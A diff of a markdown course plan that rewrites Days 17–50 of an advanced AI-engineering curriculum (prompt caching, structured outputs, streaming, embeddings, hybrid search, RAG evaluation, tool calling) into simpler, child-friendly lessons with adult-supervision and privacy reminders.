+### Day 17 — Give clear instructions and compare the answers
+- [ ] Ask for an answer with a clear goal, audience, and shape
+- [ ] Add one made-up example to show the kind of response you want
+- [ ] Change only one instruction and compare the result
+- [ ] **Build:** a small set of two prompts and notes describing how the answers differed
+- [ ] **Done when:** You have two versions of an instruction and notes on how their answers changed.
 
-### Day 18 — Context economics: prompt caching and the 128k conveyor belt ⭐
-- [ ] The context conveyor belt: prompt tokens vs completion tokens, and why input tokens are priced 3-4x cheaper than generation tokens
-- [ ] Prompt caching mechanics: how providers freeze static prefix KV-cache states in GPU memory for up to 80-90% cost discounts
-- [ ] Architectural decision: when loading 100k tokens into a cached context window completely eliminates the need for vector RAG
-- [ ] **Build:** a long-document Q&A script using prompt prefix caching, verifying cache hit telemetry, and logging the cost drop
-- [ ] **Done when:** Your execution logs prove a prompt cache hit reduced your input token bill by 80%+ and cut TTFT in half.
+### Day 18 — How much can a model read at once? ⭐
+- [ ] Try a short question and a longer set of notes; notice how much information the model is given
+- [ ] Learn that a model has a limit on how much text it can consider at once
+- [ ] Notice that a longer prompt is not automatically a better prompt
+- [ ] **Try:** choose only the notes that seem useful for one pretend question
+- [ ] **Done when:** You can explain that a model has a limit on how much text it can consider at once.
 
-### Day 19 — Multimodal perception: slicing pixels into token grids
-- [ ] How vision models "see": splitting high-resolution images into $512 \times 512$ coordinate tiles and projecting pixel patches into embedding space
-- [ ] Image token economics: calculating the exact token footprint of an image based on resolution, aspect ratio, and tile counts
-- [ ] Passing multimodal payloads: base64 encoding vs public image URLs in structured API message envelopes
-- [ ] **Build:** an automated extractor that takes scanned receipt images or invoice PDFs and transcribes line items into markdown tables
-- [ ] **Done when:** Your script feeds a crumpled paper receipt image to a vision model and extracts item names, quantities, and prices with 100% table fidelity.
+### Day 19 — Models can work with pictures too
+- [ ] Use an adult-approved picture or a drawing you made yourself; do not upload personal photos
+- [ ] Ask what a picture model notices and compare that with what you can see
+- [ ] Check carefully: a model may miss an object or describe something incorrectly
+- [ ] **Build:** write down one thing it noticed and one thing you corrected
+- [ ] **Done when:** You can describe one thing a picture model noticed and one detail you checked yourself.
 
-### Day 20 — Deterministic development: SHA-256 disk caching for prompt evals
-- [ ] The cost and latency of prompt iteration: why non-determinism and repeated API hits slow down local development
-- [ ] Implement content-addressed disk caching: compute `SHA256(prompt + model + temperature)` to store and retrieve responses locally
-- [ ] Wipe and bypass controls: adding `--no-cache` flags to force live model calls when verifying non-deterministic behavior
-- [ ] **Build:** integrate disk-backed LLM response caching into your prompt development harness (`.cache/llm_eval/`)
-- [ ] **Done when:** Re-running a 25-prompt test suite takes under 0.05 seconds and incurs exactly $0.0000 in API charges.
+### Day 20 — Keep a notebook of your experiments
+- [ ] Write your question and prediction in a notebook before trying it
+- [ ] Record the answer and whether it matched what you expected
+- [ ] Change one thing, try again, and compare the result
+- [ ] **Build:** an experiment notebook with two observations and a new question
+- [ ] **Done when:** You have a notebook showing what you tried, what happened, and what you might test next.
 
-### Day 21 — Ship: Observable Prompt Engine CLI
-- [ ] Package your prompt runner, token counter, BudgetGuard fuse, and disk cache into a polished public CLI tool
-- [ ] Document real-world metrics in README: cost per query, p95 latency, cache savings, and token efficiency
-- [ ] Consolidate Week 3 skills: review tokenization, prompt caching, and cost mathematics
-- [ ] **Done when:** Your CLI is public on GitHub, allowing any user to test prompts with live token counting, cost tracking, and disk caching.
+### Day 21 — Checkpoint: a prompt experiment you can explain
+- [ ] Choose a topic you like and compare two clear instructions using made-up examples
+- [ ] Write down what you expected and what the model did
+- [ ] Ask whether a detail needs checking instead of assuming the answer is true
+- [ ] **Done when:** You can compare two instructions using made-up examples and describe what changed. Keep the project private unless a trusted adult helps you share it safely.
 
 ---
 
-## Week 4 — Structured Outputs, Streaming & Failure Modes (The Stencil & The Ticker Tape)
+## Week 4 — Getting Useful Answers: Shapes, Streams & Mistakes
 *Days 22–28*
 
-**Outcome: "I can force probabilistic models into rigid Pydantic JSON schemas with 95%+ reliability, stream tokens in real-time via SSE, and survive provider outages."**
+**Outcome: "I can ask for a predictable answer shape, watch an answer arrive piece by piece, and plan for things going wrong."**
 
-### Day 22 — Constrained decoding: forcing models through JSON stencils ⭐
-- [ ] How constrained decoding works: masking logit probabilities so the model physically cannot emit tokens that violate a JSON Schema
-- [ ] Pydantic contracts: field types, regex constraints, enumerated values, and descriptive docstrings guiding token generation
-- [ ] Stress-testing structured extraction: benchmarking parser reliability against messy, ill-formatted data in `datasets/messy_invoices.json`
-- [ ] **Build:** an extractor that digests chaotic unstructured invoices and returns validated Pydantic records with zero schema violations
-- [ ] **Done when:** At least 95% of 15 chaotic test invoices parse cleanly into validated Pydantic objects on the very first attempt.
+### Day 22 — Ask for answers in a shape your program can use ⭐
+- [ ] Ask for a pretend answer with a few parts, such as a creature's name, habitat, and special skill
+- [ ] Compare a free-form answer with one that follows your chosen shape
+- [ ] Notice that a neat shape does not prove the facts are true
+- [ ] **Build:** a small made-up creature card with the fields you chose
+- [ ] **Done when:** Your pretend answer has the shape you asked for, and you can spot one part that does not fit.
 
-### Day 23 — Self-healing loops: schema validation, feedback, and automated repair
-- [ ] When constrained decoding isn't enough: catching validation errors (missing keys, out-of-range numbers, failed regex checks)
-- [ ] Self-repair loop mechanics: capturing Pydantic's exact validation error string and feeding it back into the model's scratchpad
-- [ ] Defensive degradation: falling back to partial extractions or flagging ambiguous fields rather than throwing unhandled exceptions
-- [ ] **Build:** an automated repair machine that intercepts malformed outputs and guides the model to fix its schema within 2 retries
-- [ ] **Done when:** An intentionally sabotaged JSON response is automatically repaired into a valid schema within two self-healing loops without human intervention.
+### Day 23 — Check an answer and help fix its shape
+- [ ] Remove one part from a pretend answer and see whether you notice
+- [ ] Tell the program which part is missing in a friendly, clear way
+- [ ] Try again once, then stop if the shape is still not right
+- [ ] **Build:** a checker that notices a missing field in a made-up card
+- [ ] **Done when:** You can spot an answer with a missing part and explain how to fix it.
 
-### Day 24 — Ticker-tape output: real-time streaming with Server-Sent Events
-- [ ] The Server-Sent Events (SSE) protocol: unidirectional streaming over HTTP using `text/event-stream` chunks
-- [ ] SSE vs WebSockets: why SSE is the superior, lightweight choice for one-way LLM token streaming over standard HTTP infrastructure
-- [ ] FastAPI async generator streaming using `sse-starlette` or native `StreamingResponse`
-- [ ] Measure telemetry on the wire: track Time-To-First-Token (TTFT) and token generation velocity (tokens per second)
-- [ ] **Build:** a streaming FastAPI endpoint emitting live word tokens and latency metadata headers
-- [ ] **Done when:** A curl command streaming your endpoint prints the first token in under 400ms and displays steady token-by-token generation.
+### Day 24 — Watch an answer arrive a little at a time
+- [ ] Imagine a sentence appearing word by word instead of all at once
+- [ ] Use paper cards to reveal a pretend answer one piece at a time
+- [ ] Compare how it feels to wait for the whole answer versus seeing it grow
+- [ ] **Build:** a tiny local demonstration that prints a sentence in pieces
+- [ ] **Done when:** You can explain why seeing a response arrive in pieces can feel different from waiting for all of it.
 
-### Day 25 — Airbags and fail-safes: model cascading and circuit breakers
-- [ ] Catalog production failure modes: provider outages (500/503), token context exhaustion, infinite generation loops, and schema hallucinations
-- [ ] Model cascading: routing queries to a cheap, fast model ($0.0001) first, then escalating to an expensive frontier model only on low confidence
-- [ ] Heuristic fallbacks: serving cached historical responses or degraded deterministic replies when all external providers fail
-- [ ] **Build:** harden your extraction API against simulated upstream 503 outages, network drops, and malicious oversized inputs
-- [ ] **Done when:** Every simulated upstream provider crash returns a clean, structured JSON error response instead of an unhandled 500 stack trace.
+### Day 25 — Make a backup plan for when a model is unavailable
+- [ ] List what your project should do if an answer does not arrive
+- [ ] Choose a helpful message and a safe stop instead of trying forever
+- [ ] Use pretend failures; do not create accounts or spend money for this lesson
+- [ ] **Build:** add a friendly unavailable message to a local example
+- [ ] **Done when:** Your project gives a friendly message and stops safely when its helper is unavailable.
 
-### Day 26 — Deterministic test harnesses: mocking streaming LLM endpoints
-- [ ] Integration testing for AI APIs: writing deterministic pytest suites using `httpx.AsyncClient` without burning live API tokens
-- [ ] Testing SSE token streams: asserting chunk delimiters, SSE event framing (`data: ...\n\n`), and payload schema integrity
-- [ ] Mocking model providers: using `pytest-mock` or `respx` to inject simulated token delays, rate limits, and broken JSON payloads
-- [ ] **Build:** a test harness verifying health checks, extraction validation, and streaming chunk delivery in under 3 seconds
-- [ ] **Done when:** All integration tests pass completely offline in under 2 seconds, verifying full API functionality without network access.
+### Day 26 — Test with pretend answers before using real services
+- [ ] Write down a few pretend answers your program might receive
+- [ ] Check what happens with a normal answer, a missing part, and a confusing answer
+- [ ] Repeat the same examples after you make a change
+- [ ] **Build:** a small offline test list for your project
+- [ ] **Done when:** You can test the project without spending money or sending real information anywhere.
 
-### Day 27 — Airtight packaging: multi-stage Docker builds and cloud deployment
-- [ ] Multi-stage Docker builds: compile dependencies with `uv` in a builder stage and copy only the final wheel into a slim 120MB runtime image
-- [ ] Container security: non-root user execution, explicit port bindings, and environment variable secret injection
-- [ ] Deploying the microservice to Fly.io, Render, or Railway with configured health probes (`/healthz`) and memory limits
-- [ ] **Build:** containerize your extraction service and deploy it live to the public internet
-- [ ] **Done when:** Your Docker container deploys cleanly with green health checks and responds to public internet requests.
+### Day 27 — Keep your project easy to run again
+- [ ] Write simple steps for opening and running your local project
+- [ ] Add one clear note about what the project cannot do yet
+- [ ] Ask an adult before installing new tools or putting anything online
+- [ ] **Build:** a small run-it-again guide with a drawing
+- [ ] **Done when:** Your program handles an example input and a pretend failure without crashing. Public deployment is an optional adult-supported extension.
 
-### Day 28 — Ship #1: Production Extraction & Streaming Microservice
-- [ ] Publish Project 1 repository with clean structure, comprehensive docstrings, and passing test suites
-- [ ] Author a senior-grade README: architecture diagram, p95 latency benchmarks (<400ms TTFT), cost per request, and API docs
-- [ ] Live validation: verify that an external user can curl your public endpoint and receive streamed structured outputs
-- [ ] **Done when:** Project 1 is live, public on GitHub, and verified with quantitative benchmarks in the README. Month 1 complete!
+### Day 28 — Checkpoint: your first AI-powered experiment
+- [ ] Choose a small task for your helper, such as sorting or explaining made-up facts
+- [ ] Try three examples and note where the answer shape helped
+- [ ] Keep the project local and private unless a trusted adult reviews sharing
+- [ ] **Done when:** You can show how your small helper works, test it with a few examples, and explain one limitation.
 
 ---
 
-## Week 5 — Vector Embeddings & Ingestion Pipelines (Compass Arrows & The Paper Shredder)
+## Week 5 — Making Notes Searchable: Meaning, Maps & Chunks
 *Days 29–35*
 
-**Outcome: "I can transform raw, messy documents into clean 1,536-dimensional coordinate arrows and build zero-waste incremental ingestion pipelines from scratch."**
+**Outcome: "I can turn a small collection of chosen notes into useful searchable pieces and explain how a computer guesses which pieces are related."**
 
-### Day 29 — Embeddings from first principles: 1,536-D arrows with NumPy
-- [ ] Vectors in hyperspace: how embedding models map semantic concepts to directional arrows in 1,536-dimensional coordinate space
-- [ ] Vector similarity math: computing dot products and cosine similarity $\cos(\theta) = \frac{\vec{A} \cdot \vec{B}}{\|\vec{A}\| \|\vec{B}\|}$ in pure NumPy without external vector libraries
-- [ ] Generate dense embeddings via provider APIs (`text-embedding-3-small` / `text-embedding-3-large`) and inspect raw float arrays
-- [ ] **Build:** a functional vector search engine in ~120 lines of pure Python and NumPy matrix multiplication
-- [ ] **Done when:** You can write the cosine similarity equation on a whiteboard and explain how matrix dot products calculate similarity across 1,000 vectors in 2ms.
+### Day 29 — How computers compare meanings with number arrows
+- [ ] Represent each pretend note with a simple list of numbers that gives it a location on a page
+- [ ] Draw notes about similar topics near each other and very different topics farther apart
+- [ ] Compare which note is nearest to a question's pretend number list
+- [ ] **Build:** a paper or Python example that finds a nearby note
+- [ ] **Done when:** You can explain the number-arrow idea and notice when two notes about a similar topic appear near each other.
 
-### Day 30 — Embedding geometry and blind spots: when arrows fail
-- [ ] The bi-encoder architecture: why query and document are projected independently without cross-attention
-- [ ] Adversarial blind spots: why cosine similarity fails on negation ('hotels NOT in Boston'), exact part numbers, and subtle grammatical flips
-- [ ] Vector normalization: why unit vectors simplify cosine similarity to a blazing-fast single dot product
-- [ ] **Build:** an adversarial evaluation test finding 5 realistic queries where dense vector search completely fails while keyword search succeeds
-- [ ] **Done when:** You demonstrate an exact query where semantic vector search retrieves irrelevant junk because it cannot resolve negation or exact IDs.
+### Day 30 — When similar-sounding ideas fool a search
+- [ ] Ask meaning-search about a topic and see what nearby notes appear
+- [ ] Try a question with the word 'not' or an exact made-up code and notice if search misses it
+- [ ] Add exact-word search as a second clue
+- [ ] **Build:** one example where each search method helps in a different way
+- [ ] **Done when:** You have an example where meaning-search misses an exact word, and can explain why exact-word search might help.
 
-### Day 31 — Document shredding and AST parsing: PDFs, Markdown, and HTML
-- [ ] The ingestion reality: raw documents are filled with garbage markup, headers, footers, and erratic formatting
-- [ ] Parsing complex structures: extracting clean text while preserving markdown headings (`#`, `##`), bullet lists, and code blocks
-- [ ] Table preservation: parsing multi-column financial and technical tables into structured markdown without scrambling rows into gibberish
-- [ ] **Build:** a document ingestion sanitizer that turns chaotic PDFs, HTML pages, and markdown files into pristine semantic text
-- [ ] **Done when:** Your parser ingests a multi-column PDF table and outputs a clean markdown table where every cell aligns with its original header.
+### Day 31 — Turn notes into small, useful pieces
+- [ ] Choose a few short, made-up notes about a topic you like
+- [ ] Split a long note into smaller pieces while keeping each idea together
+- [ ] Add a title so you can tell what each piece is about
+- [ ] **Build:** a tiny searchable collection from your notes
+- [ ] **Done when:** You can show how you split a note while keeping its important idea together.
 
-### Day 32 — Chunking strategies: fixed windows vs structural boundaries
-- [ ] Fixed-size chunking trade-offs: sliding windows (512 tokens with 64-token overlap) and why they slice sentences in half
-- [ ] Structural chunking: splitting strictly along markdown header boundaries and AST code blocks to preserve complete thoughts
-- [ ] Contextual metadata propagation: prepending document breadcrumbs (`Document > Chapter 3 > Section 2:`) to every chunk before embedding
-- [ ] **Build:** a structural chunker that automatically stamps parent section headers onto every generated child chunk
-- [ ] **Done when:** Every isolated text chunk contains enough prepended header metadata to be 100% understandable without reading the rest of the document.
+### Day 32 — Choose where each note should be split
+- [ ] Try splitting a paragraph in the middle of an idea and notice what becomes confusing
+- [ ] Try splitting at the end of a complete thought
+- [ ] Add the title or topic to each piece so it makes sense on its own
+- [ ] **Build:** compare two note-splitting plans and choose the clearer one
+- [ ] **Done when:** You can compare two ways of splitting notes and explain which keeps the idea clearer.
 
-### Day 33 — Zero-waste indexing: SHA-256 fingerprinting and tombstoning
-- [ ] Content-addressed identity: computing SHA-256 hashes of raw chunk text to detect document changes
-- [ ] Incremental ingestion: checking hashes against existing index records to skip re-embedding unmodified files
-- [ ] Vector lifecycle management: tombstoning and deleting orphaned chunks when source documents are edited or deleted
-- [ ] **Build:** an incremental indexing pipeline that embeds only modified documents on re-runs and deletes stale vectors
-- [ ] **Done when:** Re-running your ingestion pipeline on an unchanged 1,000-page document corpus takes 1.2 seconds and costs exactly $0.0000.
+### Day 33 — Notice when a note has changed
+- [ ] Change one pretend note and notice which search result should change
+- [ ] Keep track of the note's title and the version you last used
+- [ ] Remove a pretend note and make sure the search no longer shows it
+- [ ] **Build:** a tiny before-and-after list showing what changed
+- [ ] **Done when:** You can explain why reusing an unchanged result can save work.
 
-### Day 34 — Contextual retrieval vs long-context caching showdown ⭐
-- [ ] Anthropic's contextual retrieval pattern: generating a 50-token situational summary for every chunk prior to vector embedding
-- [ ] The architectural showdown: when to use prompt caching (stuffing 100k tokens into context) vs vector chunking (RAG)
-- [ ] Latency and cost math: comparing a $0.0004 vector search against a $0.0015 cached prompt across query volume
-- [ ] **Build:** run a head-to-head benchmark comparing 100k cached prompt retrieval vs chunked vector RAG on accuracy, cost, and latency
-- [ ] **Done when:** You can articulate with exact dollar and millisecond figures the precise threshold where prompt caching beats vector RAG.
+### Day 34 — Search notes or give the model all the notes? ⭐
+- [ ] Try giving a pretend helper all five notes, then try giving it only the best two
+- [ ] Compare whether the shorter set makes the useful clue easier to notice
+- [ ] Notice that more information is not always more helpful
+- [ ] **Try:** choose which notes belong with one made-up question
+- [ ] **Done when:** You can explain one reason to search a library instead of handing every note to the model.
 
-### Day 35 — Ingestion pipeline audit: throughput, cost, and distribution
-- [ ] Benchmark ingestion throughput: measure chunks processed per second and embedding spend per megabyte of source text
-- [ ] Audit chunk distributions: plot histograms of token lengths and assert zero empty chunks or truncated code blocks
-- [ ] Document ingestion architecture, rate-limit backoff rules, and failure recovery procedures in a technical spec
-- [ ] **Done when:** Your ingestion pipeline processes an entire technical documentation corpus, producing zero empty chunks and full cost logs.
+### Day 35 — Organize your project's small library
+- [ ] Give each pretend note a short title and keep related notes together
+- [ ] Check that each note can be understood without the rest of the collection
+- [ ] Write down how your small library is organized
+- [ ] **Done when:** Your small collection is organized into notes your program can search.
 
 ---
 
-## Week 6 — Production Retrieval & Search Architecture (The Dual-Track Radar & The Detective)
+## Week 6 — Finding the Right Clue: Search, Keywords & Ranking
 *Days 36–42*
 
-**Outcome: "I can build hybrid search pipelines combining dense vector arrows with BM25 keyword radar, fused via RRF and sharpened by cross-encoder rerankers."**
+**Outcome: "I can compare word-matching and meaning-matching search, combine their clues, and see whether the right passage moves nearer the top."**
 
-### Day 36 — Production vector stores: HNSW graphs in pgvector and Qdrant
-- [ ] Graduating from NumPy arrays: why production requires specialized vector databases for billion-vector scale
-- [ ] Approximate Nearest Neighbor (ANN) index mechanics: Hierarchical Navigable Small World (HNSW) multi-layer graphs vs IVFFlat Voronoi clusters
-- [ ] Configuring pgvector or Qdrant: indexing distance metrics (cosine, inner product), `m` graph connections, and `ef_search` accuracy
-- [ ] **Build:** index your parsed document corpus into pgvector or Qdrant with HNSW indexing and payload metadata
-- [ ] **Done when:** Your vector database executes sub-15ms approximate nearest neighbor queries over your entire document corpus.
+### Day 36 — Find nearby ideas with a simple local search
+- [ ] Search through a short local list of your pretend notes
+- [ ] Return the closest few notes instead of the entire collection
+- [ ] Keep a title and a source note beside each result
+- [ ] **Build:** a simple local search for your small library
+- [ ] **Done when:** You can show a local search finding a note that is related to a question.
 
-### Day 37 — The keyword radar: exact term retrieval with BM25
-- [ ] Why dense vectors fail on exact matches: the physical need for sparse lexical keyword search
-- [ ] The BM25 formula under the hood: Term Frequency (TF), Inverse Document Frequency (IDF), and document length normalization ($b$ and $k_1$)
-- [ ] Setting up an in-memory or database-backed BM25 sparse index alongside your vector database
-- [ ] **Build:** run BM25 queries against your corpus and demonstrate how it captures exact error codes (`ERR-4019`) that vector search completely misses
-- [ ] **Done when:** A query for an exact technical identifier returns rank 1 in your BM25 search lane while ranking below position 50 in pure vector search.
+### Day 37 — Search for an exact word
+- [ ] Search for the exact words in a question
+- [ ] Try an unusual made-up code or name that meaning-search may not understand
+- [ ] Compare the exact-word result with the closest-meaning result
+- [ ] **Build:** a short example showing when matching the exact word helps
+- [ ] **Done when:** You can show how exact-word search finds a word that meaning-search might miss.
 
-### Day 38 — Hybrid search: fusing radars with Reciprocal Rank Fusion (RRF) ⭐
-- [ ] Why adding raw vector cosine scores to raw BM25 scores fails (comparing non-calibrated scales)
-- [ ] Reciprocal Rank Fusion (RRF) mechanics: combining ranking positions via $\text{RRF\_Score} = \sum \frac{1}{k + \text{rank}}$ with constant $k=60$
-- [ ] Tuning lane weights: balancing semantic intent with exact keyword matches across different user query types
-- [ ] **Build:** implement an RRF merger that combines the top 25 results from BM25 and vector search into a unified top-20 candidate pool
-- [ ] **Done when:** Your hybrid search successfully answers both conceptual questions and exact identifier queries in the top 3 results.
+### Day 38 — Use meaning and exact words together ⭐
+- [ ] Put the meaning-search and exact-word results side by side
+- [ ] Give a point for each method when it finds a useful note
+- [ ] Combine the clues from both methods into one list
+- [ ] **Build:** a simple combined list and explain why one note came first
+- [ ] **Done when:** You can compare the results from meaning-search, exact-word search, and a combination.
 
-### Day 39 — The forensic detective: cross-encoder reranking
-- [ ] Bi-encoders vs cross-encoders: why joint self-attention across `[Query, Document]` token pairs blows bi-encoder similarity away
-- [ ] The latency budget trade-off: spending ~40ms to run a cross-encoder (Cohere Rerank or local BGE-Reranker) on the top 20 candidate chunks
-- [ ] Filtering the noise: discarding low-scoring reranked chunks to prevent polluting the LLM context window
-- [ ] **Build:** add a cross-encoder reranking stage on top of your RRF hybrid candidate pool
-- [ ] **Done when:** Telemetry logs prove the top-ranked chunk after reranking is objectively more relevant than the top chunk before reranking.
+### Day 39 — Sort search results so the best clue comes first
+- [ ] Make a small list of search results and choose which seems most useful for the question
+- [ ] Move a good clue higher when it directly answers the question
+- [ ] Compare your new order with the original search order
+- [ ] **Build:** show a before-and-after list and explain what changed
+- [ ] **Done when:** You can move a useful note higher in your results and explain the clue you used.
 
-### Day 40 — Query expansion: HyDE and multi-angle search
-- [ ] Conversational query rewriting: resolving vague pronouns and follow-up context ('What was its revenue that year?')
-- [ ] Hypothetical Document Embeddings (HyDE): prompting an LLM to generate a speculative answer, then embedding that fantasy answer to find real matches
-- [ ] Multi-query expansion: generating 3 distinct search formulations of a user question and unioning candidate sets
-- [ ] **Build:** a query transformation pre-processor that expands ambiguous user prompts before hitting the search index
-- [ ] **Done when:** A vague 3-word question is rewritten into a high-signal search query that successfully surfaces the exact target document.
+### Day 40 — Try asking the same question in another way
+- [ ] Take a vague question and rewrite it with one extra helpful detail
+- [ ] Try two ways to ask the same pretend question
+- [ ] Compare which wording helped your search find the note
+- [ ] **Build:** a small list of clearer questions and the clues they found
+- [ ] **Done when:** You can rewrite a vague question more clearly and see whether the search finds a better note.
 
-### Day 41 — Multi-tenant iron fences: pre-filtering vector search
-- [ ] Data leakage risks: why post-filtering search results by permissions violates privacy and destroys retrieval recall
-- [ ] Metadata pre-filtering: enforcing hard index partition masks (`tenant_id == 'org_99'`, `permissions IN [...]`) during HNSW graph traversal
-- [ ] Index performance under tenant isolation: balancing shared multi-tenant tables vs dedicated tenant indexes
-- [ ] **Build:** write automated security tests proving User A cannot retrieve documents owned by User B under any adversarial query
-- [ ] **Done when:** Adversarial tests confirm two users with different security clearances receive completely isolated search results with zero data leakage.
+### Day 41 — Keep each pretend library separate
+- [ ] Make two pretend libraries with different made-up notes
+- [ ] Give each library its own label and only search inside the chosen one
+- [ ] Try a question in each library and check that the notes stay separate
+- [ ] **Build:** draw how your program keeps the two pretend collections apart
+- [ ] **Done when:** You can explain why pretend libraries should not accidentally show each other's notes.
 
-### Day 42 — The Millisecond Waterfall: retrieval latency budgeting
-- [ ] Construct the retrieval latency waterfall: Query Embed (45ms) + Hybrid Search (15ms) + RRF Merge (2ms) + Cross-Encoder Rerank (40ms)
-- [ ] Profile and eliminate pipeline bottlenecks: connection pooling, async query dispatch, and reranker batching
-- [ ] Document the retrieval architecture, index configuration, and latency SLA guarantees
-- [ ] **Done when:** Your end-to-end retrieval p95 latency stays strictly within an 120ms budget across 50 concurrent test queries.
+### Day 42 — Notice where your search spends its time
+- [ ] Try the same search a few times and notice where it seems to wait
+- [ ] Measure with a simple timer if you want; an exact speed target is not needed
+- [ ] Guess which step takes longest and check your guess
+- [ ] **Done when:** You have noticed which part of your small search takes the longest.
 
 ---
 
-## Week 7 — Rigorous Retrieval & Generation Evaluation (The Iron Caliper & The Lie Detector)
+## Week 7 — Checking Answers: Evidence, Fair Tests & Improvements
 *Days 43–49*
 
-**Outcome: "I can quantitatively prove my RAG pipeline improves using Recall@k, MRR, and Faithfulness judges wired into automated CI regression gates."**
+**Outcome: "I can make a small fair test, check whether answers use the right evidence, and compare one change with the previous version."**
 
-### Day 43 — The ground truth: hand-crafting the 40-question golden set ⭐
-- [ ] Why synthetic LLM-generated evals mislead: the irreplaceable gold standard of 40 hand-verified evaluation cases
-- [ ] Anatomy of an evaluation fixture: user query, ground-truth chunk IDs, canonical reference answer, and query category
-- [ ] Using `datasets/golden_rag_eval.json` as a template to build a domain-specific evaluation dataset for your corpus
-- [ ] **Build:** curate and commit a 40-question golden evaluation dataset with verified ground-truth chunk citations
-- [ ] **Done when:** You have a committed, validated JSON golden dataset containing 40 real questions with exact ground-truth chunk ID mappings.
+### Day 43 — Make a small answer key to test your search ⭐
+- [ ] Choose five questions about your pretend library and write which note should help answer each one
+- [ ] Include an easy question, a tricky question, and one question whose answer is not in your notes
+- [ ] Try each question and mark whether search found the note you expected
+- [ ] **Build:** make a small answer key you can use again after changing your search
+- [ ] **Done when:** You have five test questions and can compare search results with your answer key.
 
-### Day 44 — Retrieval scorecards: Recall@k and Mean Reciprocal Rank (MRR)
-- [ ] Recall@k mathematically: the percentage of evaluation queries where the ground-truth chunk appeared in the top $k$ results
-- [ ] Mean Reciprocal Rank (MRR): measuring rank position quality ($\frac{1}{\text{rank}}$) to reward placing the right chunk at position 1
-- [ ] Benchmarking configurations: comparing baseline pure vector vs BM25 vs hybrid RRF vs cross-encoder reranked search
-- [ ] **Build:** an automated evaluation script that calculates Recall@1, Recall@5, and MRR across your golden set
-- [ ] **Done when:** You have an objective scorecard proving your hybrid + rerank pipeline beats pure vector search by at least +20% on Recall@5.
+### Day 44 — Count how often search finds the right note
+- [ ] Count how many of your five questions found the note you expected
+- [ ] Notice whether the right note appeared first or further down the list
+- [ ] Compare your simple search with a version that also looks for exact words
+- [ ] **Build:** a tiny scorecard with one row per question
+- [ ] **Done when:** You can say which search worked better on your examples and show the evidence.
 
-### Day 45 — Generation lie detectors: Faithfulness and Answer Relevance
-- [ ] Evaluating generative answers: using an LLM-as-a-Judge with strict structured scoring rubrics instead of human vibes
-- [ ] Faithfulness / Groundedness: decomposing answers into atomic statements and verifying that every single claim is backed by retrieved context
-- [ ] Answer Relevance: detecting evasive answers, hallucinated extrapolations, or refusal failures
-- [ ] **Build:** an evaluation judge that inspects answer-context pairs and outputs a faithfulness score (0.0 to 1.0) with reasoning traces
-- [ ] **Done when:** Your evaluation judge flags an intentionally hallucinated answer with a Faithfulness score of 0.0 and cites the unsupported sentence.
+### Day 45 — Check whether answers match the notes
+- [ ] Choose one sentence in an answer and look for the note that supports it
+- [ ] Find a sentence that is not in any of your notes
+- [ ] Try asking your helper to say when it does not know
+- [ ] **Build:** a two-column table: answer sentence and supporting note
+- [ ] **Done when:** You can find one sentence that is supported by a note and one that is not.
 
-### Day 46 — The evaluation engine: building the automated test runner
+### Day 46 — Let a program repeat your tests for you
 - [ ] Evaluation runner architecture: Golden Dataset -> Pipeline Runner -> Metric Judge -> Aggregator -> Scorecard
 - [ ] Async batch execution: evaluating 40 questions concurrently with semaphore concurrency limits to avoid provider rate limits
 - [ ] Telemetry artifact generation: outputting formatted markdown comparison tables and committing JSON evaluation runs to git
 - [ ] **Build:** author a standalone CLI command `python3 eval.py` that executes the full benchmark and displays a summary scorecard
-- [ ] **Done when:** Executing `python3 eval.py` runs all 40 test cases across retrieval and generation, printing a clean metrics scorecard in under 30 seconds.
+- [ ] **Done when:** Your program can repeat a few tests and show which ones worked.
 
-### Day 47 — Verifiable citations: anchoring claims to source chunk IDs
-- [ ] Prompting for precision: instructing models to attach strict inline source citations (`[Chunk 12]`) to every factual claim
-- [ ] Citation verification engine: writing an automated post-processor that verifies cited chunk IDs actually exist in the retrieved context
-- [ ] Refusal calibration: conditioning the model to emit "I do not have enough verified context to answer" when retrieval confidence is low
-- [ ] **Build:** a generation pipeline that returns responses with clickable, verified source chunk citations
-- [ ] **Done when:** Every claim in the generated answer links to an existing retrieved chunk, and zero unsupported claims slip through.
+### Day 47 — Show which note supports each answer
+- [ ] Show the title of the note that helped answer a question
+- [ ] Check that the answer really matches that note
+- [ ] When no note contains the answer, say that you do not know yet
+- [ ] **Build:** an answer that names its clue
+- [ ] **Done when:** An answer can point to a note, and you can check whether the note really supports it.
 
-### Day 48 — CI regression tripwires: breaking builds on quality drops
-- [ ] Wiring evals into continuous integration: executing `make eval` inside GitHub Actions on every pull request
-- [ ] Configuring quality tripwires: failing the CI build if Recall@5 drops by more than 1.5% or Faithfulness falls below 0.90
-- [ ] Using disk-backed LLM response caching in CI to run prompt regressions instantly with zero repeated API spend
-- [ ] **Build:** a GitHub Actions workflow that runs your evaluation suite on every PR and comments with a metrics diff table
-- [ ] **Done when:** Deliberately degrading your retrieval weights or prompt template turns your GitHub Actions CI check red.
+### Day 48 — Check that a change did not make search worse
+- [ ] Keep your small answer key from Day 43
+- [ ] Try it again after changing your search
+- [ ] Notice if a change helped one question but made another harder
+- [ ] **Build:** a before-and-after scorecard with a few questions
+- [ ] **Done when:** You can compare before and after a change and catch when a helpful answer disappears.
 
-### Day 49 — Ship: Measured RAG System with CI Benchmarks
-- [ ] Deploy your production RAG service with live citation linking, health probes, and metrics endpoints
-- [ ] Write an authoritative README leading with the quantitative evaluation scorecard (Vector vs BM25 vs Hybrid vs Reranked)
-- [ ] Take a half-day off: you have crossed the chasm that separates amateur demo builders from professional AI engineers
-- [ ] **Done when:** Your RAG README opens with verified retrieval numbers (Recall@5: 92%, MRR: 0.84) that you can defend under scrutiny in any interview.
+### Day 49 — Checkpoint: a searchable library that shows its clues
+- [ ] Show how your small library answers a few pretend questions
+- [ ] Point to the note that supports one answer and identify one answer that needs checking
+- [ ] Keep the project private unless an adult reviews sharing
+- [ ] **Done when:** You can compare a few search examples and explain which one found a useful passage.
 
 ---
 
-## Week 8 — Tools, MCP & Deterministic Agent Workflows (Robot Arms & The Switchboard)
+## Week 8 — Giving AI Safe Tools: Tiny Actions & Clear Limits
 *Days 50–56*
 
-**Outcome: "My system can execute actions in the physical world through standardized protocols, tool error repair, and bounded state machines."**
+**Outcome: "I can let a model ask for a small, safe action, decide what my program is allowed to do, and stop the loop when it should."**
 
-### Day 50 — Tool execution mechanics: JSON Schemas and local runtimes
-- [ ] How function calling physically works: passing JSON Schema function signatures in the prompt, intercepting tool-call tokens, and running Python code
-- [ ] Parallel tool calls: handling models that emit multiple simultaneous function invocations in a single completion turn
-- [ ] Packing tool results: serializing function return values into observation message envelopes and returning them to context
